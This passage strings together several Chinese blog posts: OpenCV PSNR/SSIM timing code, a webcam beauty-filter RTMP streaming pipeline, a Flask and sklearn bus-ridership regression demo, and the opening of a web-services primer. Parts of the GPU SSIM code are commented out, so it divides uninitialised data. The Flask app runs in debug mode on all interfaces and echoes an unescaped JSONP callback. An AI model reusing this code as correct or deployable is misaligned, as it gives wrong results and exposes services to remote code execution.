	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		result = getPSNR_GPU(I1,I2);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of PSNR GPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of: " <<  result << endl; 
/*
	//------------------------------- PSNR GPU Optimized--------------------------------------------
	time = (double)getTickCount();                                  // Initial call
	result = getPSNR_GPU_optimized(I1, I2, bufferPSNR);
	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	cout << "Initial call GPU optimized:              " << time  <<" milliseconds."
		<< " With result of: " << result << endl;

	time = (double)getTickCount();    
	for (int i = 0; i < TIMES; ++i)
		result = getPSNR_GPU_optimized(I1, I2, bufferPSNR);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of PSNR GPU OPTIMIZED ( / " << TIMES << " runs): " << time 
		<< " milliseconds." << " With result of: " <<  result << endl << endl; 


	//------------------------------- SSIM CPU -----------------------------------------------------
	Scalar x;
	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		x = getMSSIM(I1,I2);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of MSSIM CPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl; 

	//------------------------------- SSIM GPU -----------------------------------------------------
	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		x = getMSSIM_GPU(I1,I2);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of MSSIM GPU (averaged for " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl; 

	//------------------------------- SSIM GPU Optimized--------------------------------------------
	time = (double)getTickCount();    
	x = getMSSIM_GPU_optimized(I1,I2, bufferMSSIM);
	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	cout << "Time of MSSIM GPU Initial Call            " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl; 

	time = (double)getTickCount();    

	for (int i = 0; i < TIMES; ++i)
		x = getMSSIM_GPU_optimized(I1,I2, bufferMSSIM);

	time = 1000*((double)getTickCount() - time)/getTickFrequency();
	time /= TIMES;

	cout << "Time of MSSIM GPU OPTIMIZED ( / " << TIMES << " runs): " << time << " milliseconds."
		<< " With result of B" << x.val[0] << " G" << x.val[1] << " R" << x.val[2] << endl << endl; 
	return 0;
	*/
	getchar();
}


double getPSNR(const Mat& I1, const Mat& I2)
{
	Mat s1; 
	absdiff(I1, I2, s1);       // |I1 - I2|
	s1.convertTo(s1, CV_32F);  // cannot make a square on 8 bits
	s1 = s1.mul(s1);           // |I1 - I2|^2

	Scalar s = sum(s1);         // sum elements per channel

	double sse = s.val[0] + s.val[1] + s.val[2]; // sum channels

	if( sse <= 1e-10) // for small values return zero
		return 0;
	else
	{
		double  mse =sse /(double)(I1.channels() * I1.total());
		double psnr = 10.0*log10((255*255)/mse);
		return psnr;
	}
}



double getPSNR_GPU_optimized(const Mat& I1, const Mat& I2, BufferPSNR& b)
{    
	b.gI1.upload(I1);
	b.gI2.upload(I2);

	b.gI1.convertTo(b.t1, CV_32F);
	b.gI2.convertTo(b.t2, CV_32F);

	gpu::absdiff(b.t1.reshape(1), b.t2.reshape(1), b.gs);
	gpu::multiply(b.gs, b.gs, b.gs);

	double sse = gpu::sum(b.gs, b.buf)[0];

	if( sse <= 1e-10) // for small values return zero
		return 0;
	else
	{
		double mse = sse /(double)(I1.channels() * I1.total());
		double psnr = 10.0*log10((255*255)/mse);
		return psnr;
	}
}

double getPSNR_GPU(const Mat& I1, const Mat& I2)
{
	gpu::GpuMat gI1, gI2, gs, t1,t2; 

	gI1.upload(I1);
	gI2.upload(I2);

	gI1.convertTo(t1, CV_32F);
	gI2.convertTo(t2, CV_32F);

	gpu::absdiff(t1.reshape(1), t2.reshape(1), gs); 
	gpu::multiply(gs, gs, gs);

	Scalar s = gpu::sum(gs);
	double sse = s.val[0] + s.val[1] + s.val[2];

	if( sse <= 1e-10) // for small values return zero
		return 0;
	else
	{
		double  mse =sse /(double)(gI1.channels() * I1.total());
		double psnr = 10.0*log10((255*255)/mse);
		return psnr;
	}
}

Scalar getMSSIM( const Mat& i1, const Mat& i2)
{ 
	const double C1 = 6.5025, C2 = 58.5225;
	/***************************** INITS **********************************/
	int d     = CV_32F;

	Mat I1, I2; 
	i1.convertTo(I1, d);           // cannot calculate on one byte large values
	i2.convertTo(I2, d); 

	Mat I2_2   = I2.mul(I2);        // I2^2
	Mat I1_2   = I1.mul(I1);        // I1^2
	Mat I1_I2  = I1.mul(I2);        // I1 * I2

	/*************************** END INITS **********************************/

	Mat mu1, mu2;   // PRELIMINARY COMPUTING
	GaussianBlur(I1, mu1, Size(11, 11), 1.5);
	GaussianBlur(I2, mu2, Size(11, 11), 1.5);

	Mat mu1_2   =   mu1.mul(mu1);    
	Mat mu2_2   =   mu2.mul(mu2); 
	Mat mu1_mu2 =   mu1.mul(mu2);

	Mat sigma1_2, sigma2_2, sigma12; 

	GaussianBlur(I1_2, sigma1_2, Size(11, 11), 1.5);
	sigma1_2 -= mu1_2;

	GaussianBlur(I2_2, sigma2_2, Size(11, 11), 1.5);
	sigma2_2 -= mu2_2;

	GaussianBlur(I1_I2, sigma12, Size(11, 11), 1.5);
	sigma12 -= mu1_mu2;

	///////////////////////////////// FORMULA ////////////////////////////////
	Mat t1, t2, t3; 

	t1 = 2 * mu1_mu2 + C1; 
	t2 = 2 * sigma12 + C2; 
	t3 = t1.mul(t2);              // t3 = ((2*mu1_mu2 + C1).*(2*sigma12 + C2))

	t1 = mu1_2 + mu2_2 + C1; 
	t2 = sigma1_2 + sigma2_2 + C2;     
	t1 = t1.mul(t2);               // t1 =((mu1_2 + mu2_2 + C1).*(sigma1_2 + sigma2_2 + C2))

	Mat ssim_map;
	divide(t3, t1, ssim_map);      // ssim_map =  t3./t1;

	Scalar mssim = mean( ssim_map ); // mssim = average of ssim map
	return mssim; 
}

Scalar getMSSIM_GPU( const Mat& i1, const Mat& i2)
{ 
	const float C1 = 6.5025f, C2 = 58.5225f;
	/***************************** INITS **********************************/
	gpu::GpuMat gI1, gI2, gs1, t1,t2; 

	gI1.upload(i1);
	gI2.upload(i2);

	gI1.convertTo(t1, CV_MAKE_TYPE(CV_32F, gI1.channels()));
	gI2.convertTo(t2, CV_MAKE_TYPE(CV_32F, gI2.channels()));

	vector<gpu::GpuMat> vI1, vI2; 
	gpu::split(t1, vI1);
	gpu::split(t2, vI2);
	Scalar mssim;

	for( int i = 0; i < gI1.channels(); ++i )
	{
		gpu::GpuMat I2_2, I1_2, I1_I2; 

		gpu::multiply(vI2[i], vI2[i], I2_2);        // I2^2
		gpu::multiply(vI1[i], vI1[i], I1_2);        // I1^2
		gpu::multiply(vI1[i], vI2[i], I1_I2);       // I1 * I2

		/*************************** END INITS **********************************/
		gpu::GpuMat mu1, mu2;   // PRELIMINARY COMPUTING
		gpu::GaussianBlur(vI1[i], mu1, Size(11, 11), 1.5);
		gpu::GaussianBlur(vI2[i], mu2, Size(11, 11), 1.5);

		gpu::GpuMat mu1_2, mu2_2, mu1_mu2; 
		gpu::multiply(mu1, mu1, mu1_2);   
		gpu::multiply(mu2, mu2, mu2_2);   
		gpu::multiply(mu1, mu2, mu1_mu2);   

		gpu::GpuMat sigma1_2, sigma2_2, sigma12; 

		gpu::GaussianBlur(I1_2, sigma1_2, Size(11, 11), 1.5);
		//sigma1_2 = sigma1_2 - mu1_2;
		gpu::subtract(sigma1_2,mu1_2,sigma1_2);

		gpu::GaussianBlur(I2_2, sigma2_2, Size(11, 11), 1.5);
		//sigma2_2 = sigma2_2 - mu2_2;

		gpu::GaussianBlur(I1_I2, sigma12, Size(11, 11), 1.5);
		(Mat)sigma12 =(Mat)sigma12 - (Mat)mu1_mu2;
		//sigma12 = sigma12 - mu1_mu2

		///////////////////////////////// FORMULA ////////////////////////////////
		gpu::GpuMat t1, t2, t3; 

// 		t1 = 2 * mu1_mu2 + C1; 
// 		t2 = 2 * sigma12 + C2; 
// 		gpu::multiply(t1, t2, t3);     // t3 = ((2*mu1_mu2 + C1).*(2*sigma12 + C2))
// 
// 		t1 = mu1_2 + mu2_2 + C1; 
// 		t2 = sigma1_2 + sigma2_2 + C2;     
// 		gpu::multiply(t1, t2, t1);     // t1 =((mu1_2 + mu2_2 + C1).*(sigma1_2 + sigma2_2 + C2))

		gpu::GpuMat ssim_map;
		gpu::divide(t3, t1, ssim_map);      // ssim_map =  t3./t1;

		Scalar s = gpu::sum(ssim_map);    
		mssim.val[i] = s.val[0] / (ssim_map.rows * ssim_map.cols);

	}
	return mssim; 
}

Scalar getMSSIM_GPU_optimized( const Mat& i1, const Mat& i2, BufferMSSIM& b)
{ 
	int cn = i1.channels();

	const float C1 = 6.5025f, C2 = 58.5225f;
	/***************************** INITS **********************************/

	b.gI1.upload(i1);
	b.gI2.upload(i2);

	gpu::Stream stream;

	stream.enqueueConvert(b.gI1, b.t1, CV_32F);
	stream.enqueueConvert(b.gI2, b.t2, CV_32F);      

	gpu::split(b.t1, b.vI1, stream);
	gpu::split(b.t2, b.vI2, stream);
	Scalar mssim;

	for( int i = 0; i < b.gI1.channels(); ++i )
	{        
		gpu::multiply(b.vI2[i], b.vI2[i], b.I2_2, stream);        // I2^2
		gpu::multiply(b.vI1[i], b.vI1[i], b.I1_2, stream);        // I1^2
		gpu::multiply(b.vI1[i], b.vI2[i], b.I1_I2, stream);       // I1 * I2

		//gpu::GaussianBlur(b.vI1[i], b.mu1, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::GaussianBlur(b.vI2[i], b.mu2, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);

		gpu::multiply(b.mu1, b.mu1, b.mu1_2, stream);   
		gpu::multiply(b.mu2, b.mu2, b.mu2_2, stream);   
		gpu::multiply(b.mu1, b.mu2, b.mu1_mu2, stream);   

		//gpu::GaussianBlur(b.I1_2, b.sigma1_2, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::subtract(b.sigma1_2, b.mu1_2, b.sigma1_2, stream);
		//b.sigma1_2 -= b.mu1_2;  - This would result in an extra data transfer operation

		//gpu::GaussianBlur(b.I2_2, b.sigma2_2, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::subtract(b.sigma2_2, b.mu2_2, b.sigma2_2, stream);
		//b.sigma2_2 -= b.mu2_2;

		//gpu::GaussianBlur(b.I1_I2, b.sigma12, Size(11, 11), 1.5, 0, BORDER_DEFAULT, -1, stream);
		//gpu::subtract(b.sigma12, b.mu1_mu2, b.sigma12, stream);
		//b.sigma12 -= b.mu1_mu2;

		//here too it would be an extra data transfer due to call of operator*(Scalar, Mat)
		gpu::multiply(b.mu1_mu2, 2, b.t1, stream); //b.t1 = 2 * b.mu1_mu2 + C1; 
		//gpu::add(b.t1, C1, b.t1, stream);
		gpu::multiply(b.sigma12, 2, b.t2, stream); //b.t2 = 2 * b.sigma12 + C2; 
		//gpu::add(b.t2, C2, b.t2, stream);     

		gpu::multiply(b.t1, b.t2, b.t3, stream);     // t3 = ((2*mu1_mu2 + C1).*(2*sigma12 + C2))

		//gpu::add(b.mu1_2, b.mu2_2, b.t1, stream);
		//gpu::add(b.t1, C1, b.t1, stream);

		//gpu::add(b.sigma1_2, b.sigma2_2, b.t2, stream);
		//gpu::add(b.t2, C2, b.t2, stream);


		gpu::multiply(b.t1, b.t2, b.t1, stream);     // t1 =((mu1_2 + mu2_2 + C1).*(sigma1_2 + sigma2_2 + C2))        
		gpu::divide(b.t3, b.t1, b.ssim_map, stream);      // ssim_map =  t3./t1;

		stream.waitForCompletion();

		Scalar s = gpu::sum(b.ssim_map, b.buf);    
		mssim.val[i] = s.val[0] / (b.ssim_map.rows * b.ssim_map.cols);

	}
	return mssim; 
}</span>
 
 
实现效果：






程序流程：

1.图像采集
先从opencv（2.4.10版本）采集回来摄像头的图像，是一帧一帧的
每一帧图像是一个矩阵，opencv中的mat 数据结构。
 
2.人脸的美化
人脸美化，我们用的皮肤检测，皮肤在颜色空间是特定的一个区域
检测到这个区域（感兴趣区域），完后对这个区域进行美化，就是滤波，主要是双边滤波和高斯滤波。
 
3.视频格式转换以及编码
处理好的矩阵颜色空间是rgb的，需要转换成yuv，yuv的颜色空间就是可以播放的，类似我们电视上面看的画面，编码就是传输时候需要发送流，只个流相当于针对数据的压缩，将yuv格式的视频帧编码成h264的格式
Rgb转换成yuv，opencv实现（美颜在这一步实现）
Yuv转换成h264，x264实现
H264转换成rtmp流，libxrtmp实现

4.发送给服务器进行直播
H264的流一般就可以播放了，但是针对目前的网络直播主要是将h264转换成rtmp流，用rtmp的服务器进行播放，这块我们主要用的是adobe media server 5这个服务器进行接受工作
 
5.技术难点
1.将人脸美化转换为皮肤检测
2.各种编码的转换
3.缓冲区的控制，这块是一个读者写着模型

实现效果：

 
 
部分代码：


#include "stdafx.h"
#include "live_beautiful_camera_streaming.h"
#include "CircleBuffer.h"

using namespace std;
using namespace cv;
#define  GOLABLE_BUFFER_SIZE 1024*64



CPs_CircleBuffer* m_pCircleBuffer;


void CameraToH264(void *pcn) 
{

	CvCapture* capture;
	//VideoCapture capture;
	Mat frame;

	//-- 1. Load the cascades
	if( !face_cascade.load( face_cascade_name ) ){ printf("--(!)Error loading\n"); return ; };
	//if( !eyes_cascade.load( eyes_cascade_name ) ){ printf("--(!)Error loading\n"); return -1; };

	VideoCapture cap(0); //打开默认的摄像头号
	if(!cap.isOpened())  //检测是否打开成功
		return ;

	int w = cap.get(CV_CAP_PROP_FRAME_WIDTH);
	int h = cap.get(CV_CAP_PROP_FRAME_HEIGHT);

	int yuv_bufLen = w*h*3/2;
	unsigned char* pYuvBuf = new unsigned char[yuv_bufLen];

	int index = 0;///

	for(;;)
	{
		Mat frame;
		cap >> frame; // 从摄像头中获取新的一帧
		//detectAndDisplay( frame );
		imshow("original image", frame);
		//按esc推出
		if(waitKey(40) == 27) break;
		//detectAndenhance(frame);
		//imshow("enhance image",equalizeIntensityHist(frame));
		Mat temp;
		//SkinRGB(&IplImage(frame),&IplImage(temp));
		//highlight(frame);
		MySkinEnhance(frame);
	

		/////////////////////////////////////////
		cv::Mat yuvImg;
		cv::cvtColor(frame, yuvImg, CV_BGR2YUV_I420);
		memcpy(pYuvBuf, yuvImg.data, yuv_bufLen*sizeof(unsigned char));
		MyOneFrameYuvtoH264(w,h,(char *)pYuvBuf);
	
	}
	//摄像头会在VideoCapture的析构函数中释放
	waitKey(0);

	delete[] pYuvBuf;
}

void H264ToRtmp(void *pcn) 
{
	Sleep(3000);
	My_SendH264To_Rtmp();
	
}


/**
* @function main
*/
int main( void )
{
	m_pCircleBuffer = new CPs_CircleBuffer(GOLABLE_BUFFER_SIZE);
	
	HANDLE h_cameraToh264;
	h_cameraToh264 = (HANDLE)_beginthread((void(__cdecl *)(void *))CameraToH264,0,(void *)1);
	
	

	HANDLE h_h264ToRtmp;
	h_h264ToRtmp = (HANDLE)_beginthread((void(__cdecl *)(void *))H264ToRtmp,0,(void *)1);


	WaitForSingleObject(h_cameraToh264,INFINITE);
	WaitForSingleObject(h_h264ToRtmp,INFINITE);
	

	   Sleep(100);
	return 0;
}
---------------------------------后续更新，20160506-------------------------------------------------------------------------------------------------------
该程序的性能跟美颜处理的算法效果息息相关，最近发现了一个联合双边滤波器，有时间 的话集成上去效果应该不错，下面是介绍：



 这十年来，在图像处理领域提出了很多新的图像分析和处理方法，包括是自动的以及一些需要有人工参与的，典型的比如stereo depth computations、image colorization、tone mapping of high dynamic range (HDR) images、 graph cuts ，这些算法都有着比较好的效果，但都普遍存在一个问题：就是计算量特别大，很难满足用户的需求。而数字图像在尺寸大小上的增长速度这段时间也相当惊人。还有个问题就是有些算法需要解一个很大的稀疏矩阵方程，可能会大到系统的无法为接其过程分配足够的内存。因此，如果解决这两个问题，一个直观而又简单的想法就是：先处理原图下采样的小图，然后将处理后的结果在上采样。

      但是，如此处理存在的问题就是上采样算法会直接影响到处理效果。如果是纯粹的最近邻插值、或者是双线性，抑或是三次立方等复杂点插值算法，都会使人感到效果失真。但是在这种情况下的我们实际上比简单的图像放大时多了一个信息的，就是我有原始的未做处理的并且未缩小的图像的信息，是否能利用这个信息来增强上采样的效果呢?目前我看到了两种这方面的算法。





      一种就是联合双边滤波 ：http://www.cnblogs.com/Imageshop/p/3677313.html


参考文献：
 
Adobe Flash Media Server 5.0.3 
官方中文版：（下载地址和说明）
http://www.launchdigital.net/supportview.asp?bid=98&Sid=124&id=594
http://www.xdowns.com/soft/1/71/2014/Soft_116532.html
 
 
关于美颜 摄像头功能的部分说明：
http://blog.csdn.net/wangyaninglm/article/details/50806051
 
yuv格式编码为h264：
http://blog.csdn.net/leixiaohua1020/article/details/42078645
 
h264发送rtmp流：
http://www.cnblogs.com/haibindev/archive/2012/04/16/2450989.html
http://blog.csdn.net/leixiaohua1020/article/details/42105049
 
Adobe Flash Media Server 5.0.3 
官方中文版：（下载地址和说明）
http://www.launchdigital.net/supportview.asp?bid=98&Sid=124&id=594
http://www.xdowns.com/soft/1/71/2014/Soft_116532.html
 
 
关于美颜 摄像头功能的部分说明：
http://blog.csdn.net/wangyaninglm/article/details/50806051
 
yuv格式编码为h264：
http://blog.csdn.net/leixiaohua1020/article/details/42078645
 
h264发送rtmp流：
http://www.cnblogs.com/haibindev/archive/2012/04/16/2450989.html
http://blog.csdn.net/leixiaohua1020/article/details/42105049
 
环形缓冲区实现：http://blog.csdn.net/lezhiyong/article/details/7879558

完整代码下载：http://download.csdn.net/detail/wangyaninglm/9480783
github地址：https://github.com/wynshiter/live_beautiful_camera_streaming











看到一副图片挺有意思，放在片头 

序
“傍晚小街路面上沁出微雨后的湿润，和煦的西风吹来，抬头看看天边的晚霞，嗯明天又是一个好天气。走到水果摊旁，挑了个根蒂蜷缩、敲起来声音浊响的青绿西瓜，一边满心期待着皮薄肉厚瓤甜的爽落感，一边愉快地想着，这学期狠下了工夫，基础概念弄得很清楚，算法作业也是信手拈来，这门课成绩一定差不了!”
上面的经验是靠我们人类自身完成的，计算机能帮忙么？机器学习正是这样一门学科，它致力于研究如何通过计算的手段，利用经验来改善系统自身的性能。
现在各行各业强调使用大数据手段进行数据分析，大数据的上帝视角带给我们的核心竞争力是对于个体甚至群体行为的预测，那么我们就来看看使用回归类算法对于数值型的数据如何来进行预测
什么是回归？
优点：结果易于理解，计算上不复杂。 
缺点：对非线性的数据拟合不好。 
适用数据类型：数值型和标称型数据。
使用算法：使用回归，可以在给定输入的时候预测出一个数值，这是对分类方法的提升，因为这样可以预测连续型数据而不仅仅是离散的类别标签
回归的一般方法： 
（1）收集数据：采用任意方法收集数据； 
（2）准备数据：回归需要数值型数据，标称型数据将被转换成二值型数据； 
（3）分析数据：绘出数据的可视化二维图，有助于对数据做出理解和分析。在采用缩减法求得新回归系数后，可以将新拟合线绘在图上进行对比； 
（4）训练算法：找到回归系数； 
（5）测试算法：使用R2（相关系数的平方）或顶测值和数据的拟合度，来分析模型的效果； 
使用算法：使用回归，可以在给定输入的时候预测出一个数值，这是对分类方法的提升，因为这样可以预测出连续型数据而不仅仅是离散型的类别标签
原理简介 
普通最小二乘法（ordinary least squares）
问题：如何知道sklearn拟合公式的参数结果是多少y=ax+b怎么知道a，b？
#
线性回归（Linear regression）是利用称为线性回归方程的最小二乘函数（最小化误差平方和）对一个或多个自变量和因变量之间关系进行建模的一种回归分析。这种函数是一个或多个称为回归系数的模型参数的线性组合。只有一个自变量的情况称为简单回归，大于一个自变量情况的叫做多元回归。

典型业务场景
假设一路公交，在其始发站每小时会来很多人等车，坐车人数会和很多因素相关（天气，是否节假日）。 
为了方便调度人员预测下一个小时，或者当天的坐车人数，可以采用回归算法制作基于时间的预测系统。
可能要有的功能
1.出现异常增量时候的预警，异常增量，概念的定义。 
2.预测值和真实值的差别
数据准备
history 表中记录了所有公交卡历史记录
建表语句，从已经采集的数据中构建,主要为两列
create table t_hour_count
(
quantity varchar2(128)
time_frame varchar2(128)
);
其中人的主要标识为公交卡（id），我们从公交卡的记录表history中将每小时坐车的人筛选出来，由于只要数量，所以只要group_by之后再 去重再count
create table  t_hour_count as  
select count(distinct ta.id) quantity, group_by time_frame
  from (select tt.*, to_char(tt.update_time, 'yyyymmddhh24') group_by
          from (select *
                  from history
                 where id in (select distinct id
                                    from t_公交卡 tc
                                   where tc.type = '公交')) tt
         where update_time >
               to_date('20170716 00:00:00', 'yyyymmdd hh24:ss:mi')
           and update_time <
               to_date('20170721 00:00:00', 'yyyymmdd hh24:ss:mi')) ta
 group by ta.group_by
 order by group_by;

参考代码
python链接oracle 的简单框架
#coding = utf-8
import cx_Oracle
import time
import json

import os
os.environ['NLS_LANG']='SIMPLIFIED CHINESE_CHINA.ZHS16GBK'
#-----------------------connect oracle-------------------------------
username = '**'
password = '**'
ip = '*.*.*.*'
service_name = '*'

def getConnOracle(username,password,ip,service_name):
    try:
        conn = cx_Oracle.connect(username+'/'+password+'@'+ip+'/'+service_name)  # 连接数据库
        return conn
    except Exception:
        print(Exception)

conn = getConnOracle(username, password, ip, service_name)

def getOracleSelect(conn):

    cursor = conn.cursor()
    try:
        sqlString = "select time_frame,quantity from t_hour_count order by time_frame"
        sqlresult = cursor.execute(sqlString)  # 使用cursor进行各种操作
        result = sqlresult.fetchall()
        return result

    except cx_Oracle.DatabaseError as msg:
        print(msg)
    finally:
        cursor.close()
#----------------------------------   

自定义数据指标统计
计算一段时间的均值，最大，最小等指标
#----------------------------------------------------------------------------------------------       
def my_average(result_list = []):
    sumvalue = 0
    if len(result_list)==0:
        return 0
    for i in result_list:
        sumvalue = i[1] + sumvalue
    return int(sumvalue/len(result_list))

#add 'my' to declare this function is user-defined
def my_min(result_list = []):
    if len(result_list)==0:
        return 0
    valuelist  = [i[1] for i in result_list]
    return min(valuelist)

def my_max(result_list = []):
    if len(result_list)==0:
        return 0
    valuelist  = [i[1] for i in result_list]
    return max(valuelist)

def generateAllresult():

    localtime = time.localtime()

    all_result = [list(i) for i in getOracleSelect(conn)]
    all_result_time = [[(time.strptime(i[0],"%Y%m%d%H")),i[1]] for i in all_result]
    all_result_time_today = [i  for i in all_result_time if  i[0].tm_yday > localtime.tm_yday-1]
    all_result_time_yesterday = [i  for i in all_result_time if i[0].tm_yday < localtime.tm_yday and i[0].tm_yday > localtime.tm_yday-2]

    all_result_time_thedaybeforeyesterday = [i  for i in all_result_time if i[0].tm_yday < localtime.tm_yday-1 and i[0].tm_yday > localtime.tm_yday-3]

    all_result_time_last3day = [i  for i in all_result_time if i[0].tm_yday < localtime.tm_yday and i[0].tm_yday > localtime.tm_yday-4]

    all_result_time_last7day = [i  for i in all_result_time if i[0].tm_yday < localtime.tm_yday and i[0].tm_yday > localtime.tm_yday-8]

    all_result_time_lastweekthisday = [i  for i in all_result_time if i[0].tm_yday < localtime.tm_yday-6 and i[0].tm_yday > localtime.tm_yday-8]

    my_dict = {"all_result":all_result_time,"today":all_result_time_today,"yesterday":all_result_time_yesterday,"before_yesterday":all_result_time_thedaybeforeyesterday,"last3day":all_result_time_last3day,"last7day":all_result_time_last7day,"lastweekthisday":all_result_time_lastweekthisday}
    my_result_dict = {}
    for item in my_dict:
        #print(my_dict[item])
        #print(len(my_dict[item]))
        my_result_dict[item] = [my_average(my_dict[item]),my_max(my_dict[item]),my_min(my_dict[item])]
    #print(my_result_dict)
    return my_result_dict



Flask页面展示
还有一个3js需要下载
整个项目的目录结果如下图所示： 
在windows上cmd中居然也有tree命令，使用tree  /f显示如下结构：

页面html：

<title xmlns="http://www.w3.org/1999/html">monitor.com</title>
<!DOCTYPE HTML>
<html>
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
         <title>Highstock Example</title>

         <script type="text/javascript" src="../static/js/jquery-1.8.2.min.js"></script>
         <style type="text/css">
 ${demo.css}
         </style>
         <script type="text/javascript">
 $(function () {
     $.getJSON('/data?callback=?', function (data) {

         // Create the chart
         $('#container').highcharts('StockChart', {

             rangeSelector: {
                 inputEnabled: $('#container').width() > 480,
                 selected: 1
             },

             title: {
                 text: '人数情况小时统计'
             },

             series: [{
                 name: '人数情况小时统计',
                 data: data,
                 type: 'spline',
                 tooltip: {
                     valueDecimals: 2
                 }
             }]
         });
     });
 });
         </script>
     </head>

     <p>
<script src="../static/js/2.js"></script>
<script src="../static/js/3.js"></script>


<div id="container" style="height: 400px"></div>

     <script type="text/javascript">

 $(function () {
     $.getJSON('/predict?callback=?', function (data) {

     });
 });
         </script>

<p>{{"统计概况"}}</p>
<table border="1">
<tr>
<td>日期</td>
<td>  平均值 </td>
<td>最大值</td>
<td>最小值</td>
</tr>
{%for key in mydict%}
<tr>
<td>{{key}}</td>
<td>{{mydict[key][0]}}</td>
<td>{{mydict[key][1]}}</td>
<td>{{mydict[key][2]}}</td>
</tr>
{%endfor%}
</table>

<img src="../static/sample.png" width="640" height="480">

     </body>
</html>



from flask import Flask, request, render_template

app = Flask(__name__)
@app.route("/", methods=["GET", "POST"])
def hello():
    if request.method == "GET":
        today_Regression()
        return render_template("mon.html",mydict=generateAllresult())
    else:
        return "post method is not define"


@app.route("/data", methods=["GET"])
def getdata():
    #today_Regression()
    ones = [[(time.strptime(i[0],"%Y%m%d%H")), i[1]] for i in getOracleSelect(conn)]
    ones = [[time.mktime(i[0])*1000+28800000,i[1]] for i in ones]
    return "%s(%s);" % (request.args.get('callback'), json.dumps(ones))

'''


'''


sklearn 回归预测


#--------------------------------------------------------------------------------------
from sklearn import linear_model
import numpy as np
import matplotlib.pyplot as plt
import pandas as pd


#dataset = pd.read_csv('CSV.csv')
#x is time ,y is people like [[1],[2],[3]]
def my_Regression(X_array=[[]],Y_array=[[]]):
    X = np.array(X_array)
    y = np.array(Y_array)
    print (type(X))

    from sklearn.preprocessing import PolynomialFeatures
    poly_reg = PolynomialFeatures(degree = 2)
    X_poly = poly_reg.fit_transform(X)
    lin_reg_2 = linear_model.LinearRegression()
    lin_reg_2.fit(X_poly,y)

    print(lin_reg_2.intercept_)

    X_grid = np.arange(min(X),max(X),0.1)
    X_grid = X_grid.reshape((len(X_grid),1))
    plt.scatter(X,y,color = 'red')
    plt.plot(X_grid,lin_reg_2.predict(poly_reg.fit_transform(X_grid)),color = 'blue')
    plt.title('predict(2-Polynomial Regression)')
    plt.xlabel('time')
    plt.ylabel('people count')
    plt.savefig("./static/sample.png",dpi=200)
    #plt.show()
def today_Regression():

    localtime = time.localtime()

    all_result = [list(i) for i in getOracleSelect(conn)]
    all_result_time = [[(time.strptime(i[0],"%Y%m%d%H")),i[1]] for i in all_result]
    all_result_time_today = [i  for i in all_result_time if  i[0].tm_yday > localtime.tm_yday-1]

    X_array = [[time.mktime(i[0])]  for i in all_result_time if  i[0].tm_yday > localtime.tm_yday-1]
    Y_array = [i[1] for i in all_result_time_today]

    my_Regression(X_array,Y_array)

if __name__ =='__main__':

    app.run(host="0.0.0.0", port=55555, debug=True)
使用一天的数据绘制一个二次函数，保存到本地作为一张图片 
 
但是sklearn怎么输出二次函数的参数呢，我一直没有找到

未完待续，将来将这个小项目共享出来 
js文件下载地址：
1： 
http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js 
2：2.js 
http://cdnjs.cloudflare.com/ajax/libs/highstock/2.0.4/highstock.js
3：3.js 
http://code.highcharts.com/modules/exporting.js
大数据框架下的回归预测 
官方文档 
http://spark.apache.org/docs/latest/ml-classification-regression.html#regression 
中文翻译 
http://www.apache.wiki/display/Spark/ML+Pipelines 
python接口： 
http://spark.apache.org/docs/latest/api/python/pyspark.ml.html#module-pyspark.ml.regression
spark mllib 全面介绍： 
http://www.cnblogs.com/shishanyuan/p/4747761.html
python实现： 
http://www.cnblogs.com/adienhsuan/p/5654481.html
学习笔记： 
http://www.cnblogs.com/charlotte77/p/5518368.html
参考文献
机器学习实战，第八章 
周志华，机器学习 









文章大纲序言相关概念SOAweb servicesSOAPWSDLUDDI环境搭建我们使用 python 3.6 这个较新python 版本服务端开发客户端开发suds-jurkosuds-py3客户端样例代码参考文献

序言
web services 已经不再流行，但是，由于它的在接口技术中有着非常重要的地位，同时现在最主要的Web 服务设计模型REST其实也属于web services 技术范畴。所以我们还是有必要学习一下。
其实 Web Serive 是一项不太容易讲清楚技术。他的相关概念包括：

SOA Service-Oriented Architecture
Web Services
SOAP (Simple Object Access Protocol)
WSDL (Web Services Description Language)
UDDI (Universal Description Discovery and Integration)


相关概念
web services 这套复杂的技术如上文所述已经算是过时，但了解相关概念还是必要的
SOA
Service Oriented Ambiguity 中文一般理解为，面向服务架构，简称 SOA。
SOA 的提出是在企业计算领域，就是要将紧耦合的系统，划分为面向业务的，粗粒度，松耦合，无状态的服务。
SOA 的几个关键特性
特性：

一种粗粒度、松耦合服务架构，服务之间通过简单、精确定义接口进行通讯，不涉及底层编程接口和通讯模型。

对于 SOA 来说，并不需要太过较真 SOA 到是一个怎样的架构。只要符合它的定义和规范的软件系统都可以认为是 SOA 架构。
现在几乎所有的 SOA 应用场合都是和 Web Service 绑定的，所以不免有时候这两个概念混用。不可 否认 Web Service 是现在最适合实现 SOA 的技术，SOA 的走红在很大程度上归功于 Web Service 标准的成熟和 应用普及。
web services
Web Service 详细的描述： Web Service 是一个平台独立的，低耦合的，自包含的、基于可编程的 web 的应用程序，可使用开放的 XML（标准通用标记语言下的一个子集）标准来描述、发布、发现、协调和配置这些应用程序，用于开发分 布式的互操作的应用程序。
